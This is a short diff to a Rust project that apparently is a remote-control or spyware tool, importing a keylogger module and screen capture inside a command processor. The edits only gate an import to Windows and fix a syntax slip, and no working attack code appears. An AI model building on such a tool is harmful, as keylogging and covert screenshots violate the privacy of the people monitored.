@@ -12,7 +12,10 @@ use scrap::{Capturer, Display};
 use std::time::Duration;
 use log::{debug, error};
 use chrono::{DateTime, Utc};
+
+#[cfg(target_os = "windows")]
 use process_list::for_each_process;
+
 use crate::keylogger::*;
 
 const FLEA_PROTOCOL_VERSION: u8 = 1;
@@ -121,7 +124,7 @@ impl CommandProcessor
     #[cfg(target_os = "linux")]
     fn get_process_list(&self) -> String
     {
-        "".to_string
+        "".to_string()
     }
 
     /// Takes screenshot and save it as a PNG file in a passed file
